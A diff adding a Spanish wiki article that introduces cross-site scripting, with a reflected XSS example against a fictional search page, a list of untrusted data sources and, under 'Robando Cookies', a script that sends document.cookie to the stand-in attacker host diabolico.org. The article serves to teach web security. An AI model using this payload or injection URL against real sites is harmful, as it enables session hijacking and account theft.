@@ -1,0 +1,90 @@
+#summary Introducción a las vulnerabilidades Cross-Site Scripting.
+#sidebar EsTOCArticlesXSS
+PEDRO TE4STE 
+
+||[ArticleIntroductionToXSS English]||[JaArticleIntroductionToXSS 日本語]||[FrArticleIntroductionToXSS Français]||
+||[EsWelcome Inicio]||||[EsArticlesXSS Seguridad Web]||
+=Introducción a las vulnerabilidades Cross-Site Scripting.=
+
+Los navegadores web implementan lo que se conoce como [http://www.mozilla.org/projects/security/components/same-origin.html Políticas de Mismo Origen] con respecto al correcto acceso de un script (como un JavaScript ó VBScript) contenido en un documento cargado desde un dominio particular.  Esencialmente, el script solo puede acceder a propiedades (incluyendo cookies y objetos DOM y sus atributos) asociados con el mismo dominio que él mismo desde el mismo documento que contiene el script que fue cargado.  Esta política es necesaria para prevenir que un script cargado desde una página por ejemplo del dominio `www.diabolico.org` acceda a las cookies de `www.angelical.com`.
+
+Sin embargo, es posible para una página cargada desde `www.diabolico.org` causar que un documento sea cargado desde una URL en el dominio `angelical.com` de tal manera que este documento contenga un script escogido de `diabolico.org`. Entonces este script sería capaz, por ejemplo, de acceder y manipular cookies de `angelical.com`.  El exploit podría desencadenarse cada vez que una víctima vea la página maliciosa en `diabolico.org`.
+
+== Ejemplo de la Vulnerabilidad ==
+
+¿Cómo podría hacer una página en `www.diabolico.org` que esto suceda?
+
+Supongamos que esta es una URL en el sitio de Angelical, `http://www.angelical.com/search?q=flores`, que devuelve documentos HTML conteniendo el siguiente fragmento:
+{{{
+...
+  <p>Tu búsqueda de 'flores' devolvió los siguientes resultados:</p>
+...
+
+}}}
+
+por ejemplo, el valor del parámetro requerido `q` es insertado dentro de la página devuelta por Angelical.  Supongamos, aún más, que ese valor no es validado, filtrado ni escapado.
+
+Diabolico.org podría subir una página que cause que la siguiente URL sea cargada en el navegador (digamos, en un `<iframe>` invisible):
+{{{
+http://www.angelical.com/search?q=flores+%3Cscript%3Escript_diabolico()%3C/script%3E
+}}}
+
+Cuando una víctima cargue esta página desde `www.diabolico.org`, el navegador cargará el iframe con la URL indicada.  El documento cargado dentro del iframe ahora contendrá el fragmento
+{{{
+<p>Tu búsqueda de 'flores <script>script_diabolico()</script>'
+   devolvió los siguientes resultados:</p>
+
+}}}
+
+Cargando esta página causaría que el navegador ejecute `script_diabolico()`.  Aún peor... ¡Este script se ejecutará en el contexto de una página cargada desde `www.angelical.com`!
+
+== Exploits XSS y Payloads ==
+
+¿Que cosas demoniacas podría hacer este script?  Veamos varias posibilidades.
+
+=== Robando Cookies ===
+
+El atacante podría insertar:
+{{{
+<script>
+  i=new Image();
+  i.src="http://www.diabolico.org/snarf?cookie=" + escape(document.cookie);
+</script>
+}}}
+
+Esto causaría que el navegador haga una petición al servidor de diabolico.org que incluya en la URL las cookies de Angelical de la víctima.  Por lo tanto el atacante tendrá la cookie Angelical de la víctima en los registros de acceso de su servidor web.
+
+Por ejemplo, si las cookies robadas contuvieran todas las cookies del correo Angelical de la víctima (asumiendo que la víctima ingresó en el correo al tiempo que visitó la página de diabolico.org), entonces el atacante podría pegar esas cookies en su propio navegador, y entonces tener acceso total a la cuenta de correo de la víctima.
+
+== Programando la Aplicación Vulnerable ==
+
+Si el atacante no quiere robar la cookie y acceder directamente la aplicación usando esa cookie (tal vez porque quiera evitar dejar su dirección IP en los registro de Angelical), puede aun hacer una gran cantidad de daño.  Podría inyectar un script que realice acciones (como mandar un correo, subir un correo y mostrarlo en el sitio diabolico.org, etc.) a través del contexto de la sesión de usuario de la víctima.
+
+Un ejemplo interesante de un exploit es el gusano "Samy" que fue liberado en el sitio de red social MySpace.  El gusano usó una vulnerabilidad XSS en el sitio de MySpace para añadir usuarios como amigos de un usuario ('Samy'), y para propagarse a través de la red de relaciones amistosas en MySpace.
+
+== Modificando la Interface de Usuario ==
+
+Una tercera posibilidad podría ser para el atacante programar modificaciones para una página cargada desde el sitio vulnerable, como en este caso pudiera ser la intención de que sea visto por la víctima y, presumiblemente, ser parte de un tipo de ataque de ingeniería social (tal vez tratando de hacer que la víctima divulgue su contraseña o número de tarjeta de crédito).
+
+Estos han sido exploits de demostración para sitios nuevos vulnerables, donde el script inyectado fue usado para sobrescribir una falsa noticia en la cima de la UI de los sitios.
+
+== Fuentes de datos no probados ==
+
+En el ejemplo anterior, el vector con que el atacante fue capaz de inyectar un script malicioso dentro de un documento visto por la víctima fue un parámetro requerido en una URL de la aplicación vulnerable.
+
+Los parámetros requeridos (en campos de formulario) representan un vector XSS explotable más común y más sencillo. Sin embargo cualquier dato puede estar bajo control de un atacante y como es insertado dentro de documentos HTML deben ser considerados como vulnerabilidades XSS. Las fuentes de esos datos incluyen (pero no se limitan a) los siguientes:
+
+  * Parámetros requeridos en la URL
+  * La ruta de la URL (puede ser modificada como parte de mensajes de error "Document not found")
+  * Campos de formulario (incluyendo campos ocultos)
+  * Cookies
+  * Otras partes de las peticiones de cabecera HTTP (como la URL de origen)
+  * Datos que fueron insertados dentro de un almacenamiento de datos en una transacción anterior, posiblemente por un usuario diferente (como mensajes en Google Groups, Orkut, GMail).
+  * Datos obtenidos desde un datafeed (como merchant feeds en el buscador de productos de Google)
+  * Datos rastreados desde la web (Buscador Google) o el disco local.
+
+== Para leer más ==
+
+  * [EsArticleXSS Todo lo que siempre quisiste saber sobre ataques cross-site scripting (XSS)]
+  * [http://www.mozilla.org/projects/security/components/same-origin.html Políticas de mismo Origen] (Inglés)
+  * [http://it.slashdot.org/it/05/10/14/126233.shtml Myspace Inundado de Gusanos Cross-Site Scripting (slashdot.org)]  (Inglés)
